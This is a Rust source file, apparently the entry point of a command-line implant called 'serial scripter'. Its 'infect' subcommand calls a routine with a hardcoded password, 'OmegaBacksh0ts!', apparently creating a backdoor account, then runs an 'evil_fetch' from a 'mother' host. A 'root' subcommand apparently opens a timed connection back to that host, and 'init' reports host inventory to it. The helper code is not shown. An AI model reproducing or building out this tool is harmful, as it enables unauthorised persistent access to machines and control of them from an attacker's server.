pub mod client;
use crate::client::types::{Host, Infect, OS};
#[cfg(target_os = "linux")]
use crate::client::utils::{install_docker, install_serial_scripter};

use clap::{arg, command, value_parser, Command};

#[tokio::main]
async fn main() {
    let matches = command!()
        .subcommand(
            Command::new("init")
                .about("Initializes serial scripter")
                .arg(
                    arg!(-m --mother <TARGET> "Gets Host inventory")
                        .required(true)
                        .value_parser(value_parser!(std::net::IpAddr)),
                )
                .arg(
                    arg!(-k --key <APIKEY> "Gets Host inventory")
                        .required(true)
                        .value_parser(value_parser!(String)),
                ),
        )
        .subcommand(Command::new("ip").about("Returns ip of system"))
        .arg(arg!(-i --inventory "Gets Host inventory").required(false))
        .subcommand(
            Command::new("infect")
                .about("Performs the infect operation")
                .arg(
                    // set mother ip arg
                    arg!(-m --mother <TARGET> "Specifies the target for the infect operation")
                        .required(true)
                        .value_parser(value_parser!(std::net::IpAddr)),
                )
                .arg(
                    arg!(-p --port <PORT> "Specifies the port for the infect operation")
                        .required(true)
                        .value_parser(value_parser!(u16)),
                ),
        )
        .subcommand(
            Command::new("root")
                .about("Executes the root operation")
                .arg(
                    arg!(-l --lifetime <LIFETIME> "Specifies the lifetime of the root operation")
                        .required(true)
                        .value_parser(value_parser!(u8)),
                )
                .arg(
                    arg!(-m --mother <TARGET> "Specifies the target for the root operation")
                        .required(true)
                        .value_parser(value_parser!(std::net::IpAddr)),
                )
                .arg(
                    arg!(-p --port <PORT> "Specifies the port for the root operation")
                        .required(true)
                        .value_parser(value_parser!(u16)),
                ),
        )
        .get_matches();

    if matches.get_flag("inventory") {
        println!("{}", Host::new().to_json());
    }
    match matches.subcommand() {
        Some(("infect", sub_matches)) => {
            let mother_ip = sub_matches.get_one::<std::net::IpAddr>("mother").unwrap();
            let port = sub_matches.get_one::<u16>("port").unwrap();

            let host = Host::new();
            host.infect(69, "OmegaBacksh0ts!");

            match client::client::evil_fetch(mother_ip, port).await {
                Ok(_) => println!("Infect operation successful"),
                Err(_) => println!("Infect operation failed"),
            }
        }
        Some(("root", sub_matches)) => {
            let lifetime = sub_matches.get_one::<u8>("lifetime").unwrap();
            let mother_ip = sub_matches.get_one::<std::net::IpAddr>("mother").unwrap();
            let port = sub_matches.get_one::<u16>("port").unwrap();

            let host = Host::new();
            let _ = host.root(&mother_ip.to_string(), *port, *lifetime);
        }
        Some(("ip", _)) => println!("{}", Host::ip()),
        Some(("init", sub_matches)) => {
            let mother_ip = sub_matches.get_one::<std::net::IpAddr>("mother").unwrap();
            let api_key = sub_matches.get_one::<String>("key").unwrap();

            let host = Host::new();
            //host.infect(69, "OmegaBacksh0ts!");
            let _ = host.inventory(&mother_ip.to_string(), &api_key).await;
        }
        _ => {}
    }
}
